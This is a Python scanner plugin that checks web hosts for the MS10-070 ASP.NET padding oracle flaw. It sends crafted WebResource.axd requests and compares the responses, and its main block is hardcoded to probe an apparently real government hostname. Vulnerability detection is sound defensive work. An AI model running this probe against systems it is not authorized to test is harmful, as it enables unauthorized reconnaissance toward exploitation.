import base64
from urllib import request
import urllib


recommend_port = [
    '80',
]


def plugin_info():
    plugin_info = {
        "name": ".NET Padding Oracle信息泄露",
        "author": "wolf@YSRC",
        "level": "High",
        "type": "Read arbitrary files",
        "url": "",
    }
    return plugin_info


def run(ip_list, port_list, timeout=5):
    for ip in ip_list:
        for port in port_list:
            try:
                url = "http://{}:{}".format(ip.strip("\r\n"), port)
                response = request.urlopen(url, timeout=timeout).read()
                if "WebResource.axd?d=" in str(response):
                    error_i = 0
                    bglen = 0
                    for k in range(0, 255):
                        IV = "\x00\x00\x00\x00\x00\x00\x00\x00" \
                             "\x00\x00\x00\x00\x00\x00\x00" + chr(k)
                        bgstr = 'A' * 21 + '1'
                        enstr = base64.b64encode(bytes(IV, encoding='utf-8')).replace(b'=', b'').replace(b'/', b'-').replace(b'+', b'-')
                        exp_url = "{}/WebResource.axd?d={}".format(url, str(enstr, encoding='utf8') + bgstr)
                        try:
                            res = request.urlopen(exp_url, timeout=timeout)
                            res_html = res.read()
                            res_code = res.code
                        except request.HTTPError as e:
                            res_html = e.read()
                            res_code = e.code
                        except request.URLError as e:
                            error_i += 1
                            if error_i >=3:
                                return 'error1'
                        except:
                            return "error3"
                        if int(res_code) == 200 or int(res_code) == 500:
                            if k == 0:
                                bgcode = int(res_code)
                                bglen = len(res_html)
                            else:
                                necode = int(res_code)
                                if (bgcode != necode) or (bglen != len(res_html)):
                                    return "MS10-070 ASP.NET Padding Oracle信息泄露漏洞"
                        else:
                            return 'error2'
            except Exception as e:
                print(e)
                pass


if __name__ == '__main__':
    test = run(ip_list=['gms.ride.ri.gov'], port_list=[80])
    print(test)